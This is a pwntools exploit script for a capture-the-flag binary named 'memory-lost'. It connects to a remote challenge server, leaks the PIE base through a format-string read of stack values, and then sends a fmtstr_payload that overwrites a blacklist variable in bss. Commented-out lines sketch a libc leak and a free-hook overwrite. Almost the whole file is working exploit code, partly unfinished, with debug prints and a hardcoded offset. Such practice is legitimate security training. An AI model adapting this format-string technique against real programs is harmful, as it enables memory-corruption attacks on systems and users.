#!/usr/bin/env python3

from pwn import *

exe = ELF("./memory-lost_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux.so")
context.terminal = ['tmux', 'splitw', '-h']

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("178.128.29.224", 9481)

    return r


def main():
    # good luck pwning :)
    r = conn()
    log.info("===== LETS FIX THE PIE (BASE ADDRESS) =====")
    r.sendline("%d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d %d")
    r.recvuntil(b"-------------------------------------------\n\n")  # Wait for delimiter
    output = r.recvline()
    numbers = [int(x) for x in output.decode().split()]
    
    # Extract the 41st element (0-based index 40)
    leak_addr = numbers[40] + 93823560581120
    log.info(f"Leaked address: {hex(leak_addr)}")
    exe.address = leak_addr - 0x16f7
    log.info(hex(exe.address))
    blacklist = exe.address + 0x4010
    log.info(f"The address of bss where black list store: {hex(blacklist)}")
    fix_blacklist = fmtstr_payload(8,{blacklist: 10},write_size='short',no_dollars=True)
    # fix_blacklist = b"%d %d %d %d %d %d %d %n" + p64(exe.address)
    log.info(f"Alamat Blacklist : {hex(blacklist)}")
    log.info(f"Panjang payload : {len(fix_blacklist)} === {fix_blacklist}")
    r.sendline(fix_blacklist)
    r.sendline("aaaa")
    print(r.recv(99999))
    # r.recvuntil(b'Try to think again... what do you remember?\n')
    # print(f"TESS   {r.recvline().strip()}")
    # print(f"TESS   {r.recvline().strip()}")
    # print(f"TESS   {r.recvline().strip()}")
    # print(f"TESS   {r.recvline().strip()}")
    # print(f"TESS   {r.recvline()}")
    # libc_start_main_leak = int(r.recvline().strip().decode(),16)
    # libc.address = libc_start_main_leak - 0x29d90
    # log.info(f"LIBC START MAIN LEAK = {hex(libc_start_main_leak)}")
    # log.info(f"LIBC ADRESS = {hex(libc.address)}")
    # hook = libc.address + 0x2214a8
    # log.info(f"FREE HOOK = {hex(hook)}")
    # r.sendline("%40$p")
    # gdb.attach(r, '''
    # echo "hi"
    # break *0x55555555569e
    # continue
    # ''')  # Use tmux
    write("payload",fix_blacklist)

    r.interactive()


if __name__ == "__main__":
    main()

# 0x555555554000: 0x00010102464c457f  
# 0x555555554000: 0x00010102464c457f      0x0000000000000000

#global variable : 11

# RIP = 0x7fffffffdcb8
# idk_leak_random = 0x7fffffffdd70

# 0x7fffffffdd70 stack addr before exiting main()
